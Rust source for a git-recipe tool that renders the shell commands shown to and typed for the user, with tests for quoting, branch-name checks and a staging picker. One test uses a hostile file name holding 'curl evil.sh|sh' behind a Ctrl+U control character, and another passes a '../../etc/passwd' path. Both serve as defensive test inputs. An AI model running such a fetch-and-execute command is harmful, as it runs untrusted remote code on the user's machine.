//! Turns a recipe plus form values into the exact commands that will be typed.
//! The frontend only ever displays what this produces.

use super::model::{Action, InputKind, Recipe};
use super::template::{self, sh_quote, Value};
use super::version;
use crate::git::{self, RepoContext};
use crate::safety::{self, Risk};
use serde::Serialize;
use std::collections::{HashMap, HashSet};
use std::path::PathBuf;

/// Choices from the form beyond the recipe inputs.
#[derive(Debug, Clone, Default)]
pub struct Extras {
    /// Files picked in the staging picker; None = not chosen yet (use suggestions).
    pub staged: Option<Vec<String>>,
    /// Add a `git stash` step before switching branches with uncommitted changes.
    pub stash_first: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StageFile {
    pub path: String,
    pub code: String,
    /// Pre-checked in the picker.
    pub suggested: bool,
    /// Why it isn't suggested (e.g. "Environment file (may contain secrets)").
    pub reason: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Staging {
    /// The `git add -A` step the picker controls.
    pub step: usize,
    pub files: Vec<StageFile>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DirtySwitch {
    /// The step that switches branches.
    pub step: usize,
    /// Uncommitted changes to tracked files.
    pub changed: usize,
}

/// Above these, the staging step reads its file list from a file instead.
const MAX_INLINE_FILES: usize = 30;
const MAX_INLINE_CHARS: usize = 2000;

/// Where pathspec files go: a private per-user folder, never the repo's `.git`
/// (a downloaded repo controls what's in there, symlinks included).
pub fn pathspec_dir() -> Option<PathBuf> {
    #[cfg(test)]
    return Some(std::env::temp_dir().join(format!("branchdial-test-tmp-{}", std::process::id())));
    #[cfg(not(test))]
    crate::config::app_dir().map(|d| d.join("tmp"))
}

/// Named after its contents: the path is part of the previewed command, so it
/// must come out the same when the run re-plans to check nothing changed.
fn pathspec_path(dir: &std::path::Path, contents: &[u8]) -> PathBuf {
    let hash = super::trust::hash(&String::from_utf8_lossy(contents));
    dir.join(format!("add-{}.pathspec", &hash[..16]))
}

/// Writes a pathspec file: private folder (0700 on Unix), a fresh file that is
/// never an existing file or symlink (create-new), readable only by the user.
pub fn write_pathspec_file(path: &std::path::Path, contents: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    let dir = path.parent().ok_or_else(|| std::io::Error::other("no parent folder"))?;
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    }
    // A leftover from an earlier run (same contents): remove the entry itself, never its target.
    match std::fs::remove_file(path) {
        Err(e) if e.kind() != std::io::ErrorKind::NotFound => return Err(e),
        _ => {}
    }
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    opts.open(path)?.write_all(contents)
}

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct PlannedStep {
    pub command: String,
    pub always: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FieldError {
    /// None for problems not tied to one input (e.g. "not in a git repo").
    pub input: Option<String>,
    pub message: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Plan {
    /// Steps whose `when` holds, rendered. Missing values show as `<label>`.
    pub steps: Vec<PlannedStep>,
    /// Empty means the plan can run.
    pub errors: Vec<FieldError>,
    /// Worth knowing, but not blocking.
    pub warnings: Vec<String>,
    /// Steps that need explicit confirmation, and why.
    pub risks: Vec<Risk>,
    /// Set when a step switches branches while there are uncommitted changes.
    pub dirty_switch: Option<DirtySwitch>,
    /// The file picker for a `git add -A` before a commit.
    pub staging: Option<Staging>,
    /// NUL-separated pathspecs to write before running (long staging selections).
    #[serde(skip)]
    pub pathspec_file: Option<(PathBuf, Vec<u8>)>,
}

enum Var {
    Text(String),
    Words(Vec<String>),
    /// Not available; the string is what the preview shows instead.
    Missing(String),
}

impl Var {
    /// The value `when:` / `requires:` conditions compare against.
    fn as_cond_value(&self) -> &str {
        match self {
            Var::Text(s) => s,
            Var::Words(w) if w.is_empty() => "",
            Var::Words(_) => "true",
            Var::Missing(_) => "",
        }
    }
}

fn opt_var(v: &Option<String>, what: &str) -> Var {
    match v {
        Some(s) => Var::Text(s.clone()),
        None => Var::Missing(format!("<{what}>")),
    }
}

/// [`plan_with`] with no form extras.
#[cfg(test)]
pub fn plan(recipe: &Recipe, raw: &HashMap<String, serde_json::Value>, ctx: &RepoContext) -> Plan {
    plan_with(recipe, raw, ctx, &Extras::default())
}

pub fn plan_with(recipe: &Recipe, raw: &HashMap<String, serde_json::Value>, ctx: &RepoContext, extras: &Extras) -> Plan {
    let mut errors = Vec::new();
    let mut warnings = Vec::new();
    let mut vars: HashMap<&str, Var> = HashMap::new();
    let error = |input: Option<&str>, message: String| FieldError { input: input.map(String::from), message };

    if ctx.root.is_none() {
        errors.push(error(None, "The terminal is not inside a git repository. cd into one first.".into()));
    }
    vars.insert("current_branch", opt_var(&ctx.current_branch, "current branch"));
    vars.insert("default_branch", opt_var(&ctx.default_branch, "default branch"));
    vars.insert("repo_root", opt_var(&ctx.root.as_ref().map(|p| p.display().to_string()), "repo root"));
    vars.insert("operation", Var::Text(ctx.operation.map(|o| o.as_str()).unwrap_or("").into()));

    for input in &recipe.inputs {
        let label = input.label.clone().unwrap_or_else(|| input.id.clone());
        let given = raw.get(&input.id).filter(|v| !v.is_null()).or(input.default.as_ref());
        let mut value = match input.kind {
            InputKind::Bool => Ok(given.and_then(|v| v.as_bool()).unwrap_or(false).to_string()),
            _ => {
                let text = given.and_then(|v| v.as_str()).unwrap_or("");
                let text = if input.kind == InputKind::Branch { text.trim() } else { text };
                check_text(input.kind, text, input.required, &input.options)
            }
        };
        if let (Ok(name), Some(want), Some(root)) = (&value, input.exists, &ctx.root) {
            if !name.is_empty() {
                let local = git::local_branch_exists(root, name);
                if want && !local && !git::remote_branch_exists(root, name) {
                    value = Err(format!("No branch named {name:?} (locally or on origin)"));
                } else if !want && local {
                    value = Err(format!("Branch {name:?} already exists"));
                }
            }
        }
        match value {
            Ok(v) => {
                vars.insert(&input.id, Var::Text(v));
            }
            Err(message) => {
                errors.push(error(Some(&input.id), message));
                vars.insert(&input.id, Var::Missing(format!("<{label}>")));
            }
        }
    }

    if ctx.root.is_some() {
        for r in &recipe.requires {
            let v = vars.get(r.cond.var()).map(Var::as_cond_value).unwrap_or("");
            if !r.cond.eval(v) {
                errors.push(error(None, r.message.clone()));
            }
        }
    }

    // Version bump: computed from the manifests, expanded into visible commands.
    let mut bump_commands = Vec::new();
    if let Some(vdef) = &recipe.version {
        let set_missing =|vars: &mut HashMap<&str, Var>| {
            vars.insert("version", Var::Missing("<version>".into()));
            vars.insert("new_version", Var::Missing("<new version>".into()));
            vars.insert("version_files", Var::Missing("<version files>".into()));
        };
        match (&ctx.root, vars.get(vdef.bump.as_str())) {
            (Some(root), Some(Var::Text(how))) => match version::plan_bump(root, &vdef.files, how) {
                Ok(b) => {
                    vars.insert("version", Var::Text(b.current.to_string()));
                    vars.insert("new_version", Var::Text(b.new.to_string()));
                    vars.insert("version_files", Var::Words(b.files));
                    bump_commands = b.commands;
                    warnings.extend(b.warnings);
                }
                Err(e) => {
                    errors.push(error(Some(&vdef.bump), e));
                    set_missing(&mut vars);
                }
            },
            _ => set_missing(&mut vars),
        }
    }

    let mut steps = Vec::new();
    // Version files are repo-relative; run from the root if the terminal is in a subfolder.
    if recipe.version.is_some() && ctx.cwd_is_not_root() {
        if let Some(root) = &ctx.root {
            let root = root.to_string_lossy().replace('\\', "/");
            steps.push(PlannedStep { command: format!("cd {}", sh_quote(&root)), always: false });
        }
    }

    let mut needs_branch = false;
    let mut used_display = false;
    for step in &recipe.steps {
        if let Some(cond) = &step.when {
            // A condition on a value the user hasn't filled in yet counts as false.
            let v = vars.get(cond.var()).map(Var::as_cond_value).unwrap_or("");
            if !cond.eval(v) {
                continue;
            }
        }
        let run = match &step.action {
            Action::UpdateVersionFiles => {
                steps.extend(bump_commands.iter().map(|c| PlannedStep { command: c.clone(), always: step.always }));
                continue;
            }
            Action::Run(run) => run,
        };
        // Steps that operate on an empty file list (tag-only projects) have nothing to do.
        if matches!(vars.get("version_files"), Some(Var::Words(w)) if w.is_empty())
            && template::placeholders(run).is_ok_and(|p| p.iter().any(|n| n == "version_files"))
        {
            continue;
        }
        let rendered = template::render(run, |name| match vars.get(name) {
            Some(Var::Text(v)) => Ok(Value::Quoted(v.clone())),
            Some(Var::Words(w)) => Ok(Value::Words(w.clone())),
            Some(Var::Missing(display)) => {
                used_display = true;
                if name == "current_branch" {
                    needs_branch = true;
                }
                Ok(Value::Display(display.clone()))
            }
            None => Err(format!("unknown variable {name}")),
        });
        match rendered {
            Ok(command) => steps.push(PlannedStep { command, always: step.always }),
            // Validated at load time; only reachable if that check is bypassed.
            Err(e) => errors.push(error(None, e)),
        }
    }
    if needs_branch && ctx.root.is_some() {
        errors.push(error(None, "HEAD is detached; this recipe needs you to be on a branch.".into()));
    }
    let uses_default = recipe.steps.iter().any(|s| matches!(&s.action, Action::Run(r) if r.contains("default_branch")));
    if ctx.root.is_some() && ctx.default_branch.is_none() && uses_default {
        errors.push(error(None, "Could not find the default branch (no origin/HEAD, main or master).".into()));
    }
    // Invariant: a `<placeholder>` is only for display and must never be typed.
    if used_display && errors.is_empty() {
        errors.push(error(None, "Some values are missing.".into()));
    }

    // Switching branches with uncommitted changes: reported so the form can ask;
    // with "stash first" chosen, a visible stash step goes in front.
    let mut dirty_switch = None;
    let tracked_changes = ctx.changes.iter().filter(|c| c.tracked).count();
    if tracked_changes > 0 {
        if let Some(step) = safety::first_unstashed_switch(&steps) {
            dirty_switch = Some(DirtySwitch { step, changed: tracked_changes });
            if extras.stash_first {
                let msg = format!("branchdial: before {}", recipe.name);
                steps.insert(0, PlannedStep { command: format!("git stash push -u -m {}", sh_quote(&msg)), always: false });
            }
        }
    }

    let (staging, pathspec_file) = staging(&mut steps, ctx, extras, &mut errors);

    // Inputs are checked above; this also covers file and folder names that end up
    // in a command (e.g. `cd '<repo root>'`). The runner refuses these too.
    if let Some(s) = steps.iter().find(|s| !typeable(&s.command)) {
        errors.push(error(
            None,
            format!(
                "This command contains control characters (from a file or folder name?) and can't be typed safely: {}",
                s.command.escape_debug()
            ),
        ));
    }

    let protected: Vec<String> = if ctx.protected.is_empty() {
        safety::DEFAULT_PROTECTED.iter().map(|s| s.to_string()).collect()
    } else {
        ctx.protected.clone()
    };
    let risks = safety::analyze(&steps, ctx.current_branch.as_deref(), &protected);

    Plan { steps, errors, warnings, risks, dirty_switch, staging, pathspec_file }
}

const ADD_ALL: [&str; 4] = ["git add -A", "git add .", "git add --all", "git add -A ."];

/// Why a changed file probably shouldn't be committed, if it looks like one of those.
pub fn not_suggested_reason(path: &str) -> Option<&'static str> {
    let trimmed = path.trim_end_matches('/');
    let segments: Vec<&str> = trimmed.split('/').collect();
    let name = segments.last().copied().unwrap_or("");
    let ext = name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase()).unwrap_or_default();
    let is_template = [".example", ".sample", ".template", ".dist"].iter().any(|s| name.ends_with(s));
    if (name == ".env" || name.starts_with(".env.")) && !is_template {
        return Some("Environment file (may contain secrets)");
    }
    if ["pem", "key", "p12", "pfx", "jks", "keystore"].contains(&ext.as_str()) || name.starts_with("id_rsa") || name.starts_with("id_ed25519") {
        return Some("Private key or certificate");
    }
    if segments.contains(&"node_modules") {
        return Some("Installed dependencies");
    }
    if segments.iter().any(|s| ["dist", "build", "out", "target", "coverage", ".next", ".nuxt", "__pycache__"].contains(s)) {
        return Some("Build output");
    }
    if name == ".DS_Store" || name == "Thumbs.db" {
        return Some("OS metadata file");
    }
    if ext == "log" {
        return Some("Log file");
    }
    None
}

/// A pathspec that matches exactly `path` (repo-relative), from the terminal's cwd.
fn pathspec(path: &str, from_subdir: bool) -> String {
    let mut magic = vec![];
    if from_subdir {
        magic.push("top");
    }
    if path.contains(['*', '?', '[', '\\']) || path.starts_with(':') {
        magic.push("literal");
    }
    if magic.is_empty() {
        path.to_string()
    } else {
        format!(":({}){path}", magic.join(","))
    }
}

/// Offers the file picker for a `git add -A` that precedes a commit, and
/// rewrites that step to add only the chosen files.
fn staging(
    steps: &mut [PlannedStep],
    ctx: &RepoContext,
    extras: &Extras,
    errors: &mut Vec<FieldError>,
) -> (Option<Staging>, Option<(PathBuf, Vec<u8>)>) {
    let Some(step) = steps.iter().position(|s| ADD_ALL.contains(&s.command.trim())) else { return (None, None) };
    let commits_later = steps[step + 1..]
        .iter()
        .any(|s| safety::simple_commands(&s.command).iter().any(|w| w.len() >= 2 && w[0] == "git" && w[1] == "commit"));
    if !commits_later || ctx.changes.is_empty() {
        return (None, None);
    }

    let files: Vec<StageFile> = ctx
        .changes
        .iter()
        .map(|c| {
            let reason = not_suggested_reason(&c.path);
            StageFile { path: c.path.clone(), code: c.code.clone(), suggested: reason.is_none(), reason: reason.map(String::from) }
        })
        .collect();
    let all: HashSet<&str> = files.iter().map(|f| f.path.as_str()).collect();
    let chosen: Vec<String> = match &extras.staged {
        Some(sel) => sel.iter().filter(|p| all.contains(p.as_str())).cloned().collect(),
        None => files.iter().filter(|f| f.suggested).map(|f| f.path.clone()).collect(),
    };

    let mut pathspec_file = None;
    if chosen.is_empty() {
        errors.push(FieldError { input: None, message: "Select at least one file to commit.".into() });
    } else if chosen.len() < files.len() {
        let sub = ctx.cwd_is_not_root();
        let specs: Vec<String> = chosen.iter().map(|p| pathspec(p, sub)).collect();
        let inline = format!("git add -- {}", specs.iter().map(|s| sh_quote(s)).collect::<Vec<_>>().join(" "));
        // A name with control characters can't be typed: the shell's line editor would
        // act on them as keys (Ctrl+U erases the line) before quoting matters. Such
        // names only ever travel in the NUL-separated file.
        let untypeable = specs.iter().any(|s| !typeable(s));
        steps[step].command = match pathspec_dir() {
            Some(dir) if untypeable || specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
                let contents = specs.join("\0").into_bytes();
                let file = pathspec_path(&dir, &contents);
                let shown = file.to_string_lossy().replace('\\', "/");
                pathspec_file = Some((file, contents));
                format!("git add --pathspec-from-file={} --pathspec-file-nul", sh_quote(&shown))
            }
            _ => inline,
        };
    }
    (Some(Staging { step, files }), pathspec_file)
}


/// Can this be typed into an interactive shell as-is? Control characters (C0,
/// DEL, C1) are keys to the line editor, not text, whatever the quoting.
pub fn typeable(s: &str) -> bool {
    !s.chars().any(char::is_control)
}

/// Ok(value) or Err(message). Optional fields may be empty.
fn check_text(kind: InputKind, text: &str, required: bool, options: &[String]) -> Result<String, String> {
    if text.trim().is_empty() {
        return if required { Err("Required".into()) } else { Ok(String::new()) };
    }
    if text.chars().any(|c| c.is_control()) {
        return Err("Must be a single line without control characters".into());
    }
    match kind {
        InputKind::Branch => check_branch_name(text).map(|_| text.to_string()),
        InputKind::Select if !options.iter().any(|o| o == text) => Err(format!("Must be one of: {}", options.join(", "))),
        _ => Ok(text.to_string()),
    }
}

/// Mirrors `git check-ref-format --branch` for the rules that matter here,
/// and also refuses a leading `-` so a name can never be read as an option.
pub fn check_branch_name(name: &str) -> Result<(), String> {
    let bad = |why: &str| Err(format!("Invalid branch name: {why}"));
    if name.starts_with('-') {
        return bad("can't start with -");
    }
    if name.chars().any(|c| c.is_whitespace() || "~^:?*[\\".contains(c)) {
        return bad("no spaces or any of ~ ^ : ? * [ \\");
    }
    if name.contains("..") || name.contains("@{") || name.contains("//") {
        return bad("no .., @{ or //");
    }
    if name == "@" || name.starts_with('/') || name.ends_with('/') || name.ends_with('.') {
        return bad("can't be @, or start/end with / or end with .");
    }
    if name.split('/').any(|part| part.starts_with('.') || part.ends_with(".lock")) {
        return bad("no part may start with . or end with .lock");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::ChangedFile;
    use crate::recipes::model::{RecipeDef, Source};
    use serde_json::json;
    use std::path::PathBuf;

    fn recipe(yaml: &str) -> Recipe {
        serde_yaml::from_str::<RecipeDef>(yaml).unwrap().validate(Source::Builtin).unwrap()
    }

    fn ctx() -> RepoContext {
        RepoContext {
            root: Some(PathBuf::from("/repo")),
            current_branch: Some("feature/a".into()),
            default_branch: Some("main".into()),
            ..Default::default()
        }
    }

    fn vals(pairs: &[(&str, serde_json::Value)]) -> HashMap<String, serde_json::Value> {
        pairs.iter().map(|(k, v)| (k.to_string(), v.clone())).collect()
    }

    const BCP: &str = r#"
name: bcp
inputs:
  - { id: branch, label: Branch name, type: branch, required: true }
  - { id: msg, label: Commit message, required: true }
steps:
  - git checkout -b "{{branch}}"
  - git commit -m "{{msg}}"
"#;

    #[test]
    fn renders_safely_quoted_commands() {
        let p = plan(&recipe(BCP), &vals(&[("branch", json!("feat/x")), ("msg", json!("it's $(done)"))]), &ctx());
        assert!(p.errors.is_empty(), "{:?}", p.errors);
        let cmds: Vec<_> = p.steps.iter().map(|s| s.command.as_str()).collect();
        assert_eq!(cmds, vec!["git checkout -b 'feat/x'", r"git commit -m 'it'\''s $(done)'"]);
    }

    #[test]
    fn missing_values_show_placeholders_and_errors() {
        let p = plan(&recipe(BCP), &vals(&[]), &ctx());
        assert_eq!(p.steps[0].command, "git checkout -b <Branch name>");
        assert_eq!(p.errors.len(), 2);
    }

    #[test]
    fn rejects_option_injection_and_newlines() {
        let p = plan(&recipe(BCP), &vals(&[("branch", json!("--force")), ("msg", json!("a\nb"))]), &ctx());
        let inputs: Vec<_> = p.errors.iter().filter_map(|e| e.input.as_deref()).collect();
        assert_eq!(inputs, vec!["branch", "msg"]);
    }

    #[test]
    fn when_and_defaults() {
        let r = recipe(
            r#"
name: m
inputs:
  - { id: no_ff, type: bool, default: true }
  - { id: target, type: select, options: [dev, prod], default: dev }
steps:
  - git checkout "{{target}}"
  - run: git merge --no-ff "{{current_branch}}"
    when: no_ff
  - run: git merge "{{current_branch}}"
    when: "!no_ff"
  - run: git checkout "{{current_branch}}"
    always: true
"#,
        );
        let p = plan(&r, &vals(&[]), &ctx());
        assert!(p.errors.is_empty(), "{:?}", p.errors);
        let cmds: Vec<_> = p.steps.iter().map(|s| s.command.as_str()).collect();
        assert_eq!(
            cmds,
            vec!["git checkout 'dev'", "git merge --no-ff 'feature/a'", "git checkout 'feature/a'"]
        );
        assert!(p.steps[2].always);

        let p = plan(&r, &vals(&[("no_ff", json!(false)), ("target", json!("prod"))]), &ctx());
        assert_eq!(p.steps[1].command, "git merge 'feature/a'");
        let p = plan(&r, &vals(&[("target", json!("nope"))]), &ctx());
        assert_eq!(p.errors.len(), 1);
    }

    #[test]
    fn outside_repo_or_detached() {
        let r = recipe("name: x\nsteps:\n  - git checkout \"{{current_branch}}\"");
        assert!(!plan(&r, &vals(&[]), &RepoContext::default()).errors.is_empty());
        let detached = RepoContext { current_branch: None, ..ctx() };
        let p = plan(&r, &vals(&[]), &detached);
        assert!(p.errors[0].message.contains("detached"));
    }

    #[test]
    fn requires_blocks_with_its_message() {
        let r = recipe(
            "name: abort\nrequires:\n  - { when: operation, message: Nothing to abort }\nsteps:\n  - git merge --abort",
        );
        let p = plan(&r, &vals(&[]), &ctx());
        assert_eq!(p.errors[0].message, "Nothing to abort");
        let merging = RepoContext { operation: Some(crate::git::Operation::Merge), ..ctx() };
        assert!(plan(&r, &vals(&[]), &merging).errors.is_empty());
    }

    #[test]
    fn branch_existence_checks() {
        let repo = crate::git::testutil::TempRepo::new("exists");
        repo.git(&["branch", "taken"]);
        let r = recipe(
            "name: x\ninputs:\n  - { id: new, type: branch, exists: false }\n  - { id: old, type: branch, exists: true }\nsteps:\n  - git switch -c {{new}} {{old}}",
        );
        let c = crate::git::context(&repo.work);
        let p = plan(&r, &vals(&[("new", json!("fresh")), ("old", json!("taken"))]), &c);
        assert!(p.errors.is_empty(), "{:?}", p.errors);
        let p = plan(&r, &vals(&[("new", json!("taken")), ("old", json!("ghost"))]), &c);
        let msgs: Vec<_> = p.errors.iter().map(|e| e.message.as_str()).collect();
        assert!(msgs[0].contains("already exists") && msgs[1].contains("No branch"), "{msgs:?}");
    }

    #[test]
    fn version_bump_plan_from_subfolder() {
        let repo = crate::git::testutil::TempRepo::new("bumpplan");
        std::fs::create_dir_all(repo.work.join("sub")).unwrap();
        std::fs::write(repo.work.join("Cargo.toml"), "[package]\nname = \"a\"\nversion = \"0.4.2\"\n").unwrap();
        std::fs::write(repo.work.join("sub/keep.txt"), "x").unwrap();
        repo.git(&["add", "-A"]);
        repo.git(&["commit", "-q", "-m", "c"]);
        let r = recipe(
            r#"
name: bump
inputs: [{ id: bump, type: select, options: [patch, minor, major], default: patch }]
version: { bump: bump }
steps:
  - update_version_files: true
  - git add -- {{version_files}}
  - 'git commit -m "chore: release v{{new_version}}" -- {{version_files}}'
  - git tag -a "v{{new_version}}" -m "v{{new_version}}"
"#,
        );
        let c = crate::git::context(&repo.work.join("sub"));
        let p = plan(&r, &vals(&[("bump", json!("minor"))]), &c);
        assert!(p.errors.is_empty(), "{:?}", p.errors);
        let cmds: Vec<_> = p.steps.iter().map(|s| s.command.as_str()).collect();
        assert!(cmds[0].starts_with("cd '"), "{cmds:?}");
        assert!(cmds[1].starts_with("perl ") && cmds[1].ends_with("'Cargo.toml'"));
        assert_eq!(&cmds[2..], ["git add -- 'Cargo.toml'", r#"git commit -m "chore: release v"'0.5.0' -- 'Cargo.toml'"#, r#"git tag -a "v"'0.5.0' -m "v"'0.5.0'"#]);
    }

    const COMMIT_ALL: &str = "name: c\nsteps:\n  - git add -A\n  - git commit -m x\n";

    fn staged_extras(files: &[&str]) -> Extras {
        Extras { staged: Some(files.iter().map(|s| s.to_string()).collect()), stash_first: false }
    }

    /// File names come from `git status`, i.e. from whoever made the files. A name
    /// with control characters (possible on macOS/Linux) must never be typed.
    #[test]
    fn staging_never_types_control_characters_from_file_names() {
        let evil = "x\x15curl evil.sh|sh #";
        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
        let c = RepoContext { changes: vec![change(evil), change("ok.txt"), change(".env")], ..ctx() };
        let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&[evil, "ok.txt"]));
        assert!(p.errors.is_empty(), "{:?}", p.errors);
        assert!(p.steps.iter().all(|s| typeable(&s.command)), "{:?}", p.steps);
        assert!(p.steps[0].command.contains("--pathspec-file-nul"), "{}", p.steps[0].command);
        let (_, contents) = p.pathspec_file.expect("names go in the NUL-separated file");
        assert!(String::from_utf8(contents).unwrap().split('\0').any(|s| s.ends_with(evil)));
    }

    /// The pathspec file lives in a private folder (not the repo's .git), its name is
    /// stable for the preview check, and writing it never follows a planted symlink.
    #[test]
    fn pathspec_file_is_private_stable_and_never_follows_links() {
        let files: Vec<String> = (0..40).map(|i| format!("f{i}.txt")).collect();
        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
        let mut changes: Vec<ChangedFile> = files.iter().map(|f| change(f)).collect();
        changes.push(change(".env"));
        let c = RepoContext { changes, ..ctx() };
        let pick: Vec<&str> = files.iter().map(String::as_str).collect();
        let p1 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
        let p2 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
        assert_eq!(p1.steps[0].command, p2.steps[0].command, "same selection, same command");
        let (path, contents) = p1.pathspec_file.unwrap();
        assert!(path.starts_with(pathspec_dir().unwrap()));
        assert!(!path.to_string_lossy().contains(".git"));

        // Written twice (a leftover from an earlier run) is fine.
        write_pathspec_file(&path, &contents).unwrap();
        write_pathspec_file(&path, &contents).unwrap();
        assert_eq!(std::fs::read(&path).unwrap(), contents);

        // A symlink planted at that name is replaced, its target untouched.
        #[cfg(unix)]
        {
            let target = pathspec_dir().unwrap().join("victim");
            std::fs::write(&target, "keep me").unwrap();
            std::fs::remove_file(&path).unwrap();
            std::os::unix::fs::symlink(&target, &path).unwrap();
            write_pathspec_file(&path, &contents).unwrap();
            assert_eq!(std::fs::read_to_string(&target).unwrap(), "keep me");
            assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
            let _ = std::fs::remove_file(target);
        }
        let _ = std::fs::remove_file(&path);
    }

    /// Built-in variables skip the form checks; a folder name with control
    /// characters (`cd '<root>'` before a version bump) is refused, not typed.
    #[test]
    fn control_characters_in_any_command_are_an_error() {
        let r = recipe("name: r\nsteps:\n  - echo {{repo_root}}\n");
        let c = RepoContext { root: Some(PathBuf::from("/tmp/a\x15b")), ..ctx() };
        assert!(plan(&r, &vals(&[]), &c).errors.iter().any(|e| e.message.contains("control characters")));
    }

    #[test]
    fn staging_picker_suggests_and_rewrites() {
        let repo = crate::git::testutil::TempRepo::new("stage");
        for f in ["src.txt", ".env", ".env.example", "server.key"] {
            std::fs::write(repo.work.join(f), "x").unwrap();
        }
        std::fs::create_dir_all(repo.work.join("dist")).unwrap();
        std::fs::write(repo.work.join("dist/app.js"), "x").unwrap();
        let r = recipe(COMMIT_ALL);
        let c = crate::git::context(&repo.work);

        // Default: risky files unchecked, the add step rewritten to the rest.
        let p = plan(&r, &vals(&[]), &c);
        let s = p.staging.as_ref().unwrap();
        let unsuggested: Vec<_> = s.files.iter().filter(|f| !f.suggested).map(|f| f.path.as_str()).collect();
        assert_eq!(unsuggested, [".env", "dist/", "server.key"]);
        assert_eq!(p.steps[0].command, "git add -- '.env.example' 'src.txt'");

        // Everything selected: keep the recipe's own `git add -A`.
        let all = staged_extras(&["src.txt", ".env", ".env.example", "server.key", "dist/"]);
        assert_eq!(plan_with(&r, &vals(&[]), &c, &all).steps[0].command, "git add -A");
        // Nothing selected: can't run.
        assert!(!plan_with(&r, &vals(&[]), &c, &staged_extras(&[])).errors.is_empty());
        // Unknown paths are ignored, never typed.
        let odd = plan_with(&r, &vals(&[]), &c, &staged_extras(&["src.txt", "../../etc/passwd"]));
        assert_eq!(odd.steps[0].command, "git add -- 'src.txt'");
    }

    /// Many files from a subfolder: a pathspec file with top/literal magic that git really accepts.
    #[test]
    fn long_selection_uses_pathspec_file() {
        let repo = crate::git::testutil::TempRepo::new("pathspec");
        std::fs::create_dir_all(repo.work.join("sub")).unwrap();
        let mut names = vec![];
        for i in 0..40 {
            let n = format!("f{i} [x].txt");
            std::fs::write(repo.work.join(&n), "x").unwrap();
            names.push(n);
        }
        std::fs::write(repo.work.join(".env"), "SECRET=1").unwrap();
        let r = recipe(COMMIT_ALL);
        let c = crate::git::context(&repo.work.join("sub"));
        let p = plan(&r, &vals(&[]), &c);
        assert!(p.steps[0].command.starts_with("git add --pathspec-from-file="), "{}", p.steps[0].command);
        let (path, contents) = p.pathspec_file.clone().unwrap();
        write_pathspec_file(&path, &contents).unwrap();

        #[cfg(windows)]
        let bash = crate::shell::find_git_bash().unwrap();
        #[cfg(not(windows))]
        let bash = std::path::PathBuf::from("/bin/bash");
        let ok = std::process::Command::new(bash)
            .args(["--norc", "-c", &p.steps[0].command])
            .current_dir(repo.work.join("sub"))
            .status()
            .unwrap();
        assert!(ok.success());
        let staged = crate::git::git(&repo.work, &["diff", "--cached", "--name-only"]).unwrap();
        assert_eq!(staged.lines().count(), 40);
        assert!(!staged.contains(".env"));
    }

    #[test]
    fn dirty_switch_warns_or_stashes_first() {
        let repo = crate::git::testutil::TempRepo::new("dirty");
        repo.git(&["branch", "dev"]);
        let r = recipe("name: Go to dev\nsteps:\n  - git checkout dev\n");
        let c = crate::git::context(&repo.work);
        assert!(plan(&r, &vals(&[]), &c).dirty_switch.is_none(), "clean tree");

        std::fs::write(repo.work.join("README.md"), "edited\n").unwrap();
        let c = crate::git::context(&repo.work);
        let p = plan(&r, &vals(&[]), &c);
        assert_eq!(p.dirty_switch.as_ref().map(|d| (d.step, d.changed)), Some((0, 1)));

        let p = plan_with(&r, &vals(&[]), &c, &Extras { staged: None, stash_first: true });
        assert!(p.dirty_switch.is_some(), "still reported so the form keeps showing the choice");
        assert_eq!(p.steps[0].command, "git stash push -u -m 'branchdial: before Go to dev'");

        // Untracked files alone don't count.
        repo.git(&["checkout", "-q", "README.md"]);
        std::fs::write(repo.work.join("scratch.txt"), "x").unwrap();
        assert!(plan(&r, &vals(&[]), &crate::git::context(&repo.work)).dirty_switch.is_none());
    }

    #[test]
    fn risks_use_the_current_branch_and_protected_list() {
        let r = recipe("name: p\nsteps:\n  - git push\n");
        assert_eq!(plan(&r, &vals(&[]), &RepoContext { current_branch: Some("main".into()), ..ctx() }).risks.len(), 1);
        assert!(plan(&r, &vals(&[]), &ctx()).risks.is_empty(), "feature/a is not protected");
        let custom = RepoContext { protected: vec!["feature/*".into()], ..ctx() };
        assert_eq!(plan(&r, &vals(&[]), &custom).risks.len(), 1);
    }

    #[test]
    fn branch_names() {
        for ok in ["main", "feature/login", "fix-123", "user/a.b"] {
            assert!(check_branch_name(ok).is_ok(), "{ok}");
        }
        for bad in ["-f", "a b", "a..b", "a~1", "x.lock", "/a", "a/", "a.", ".a", "a//b", "@", "a@{1}", "a:b"] {
            assert!(check_branch_name(bad).is_err(), "{bad}");
        }
    }
}
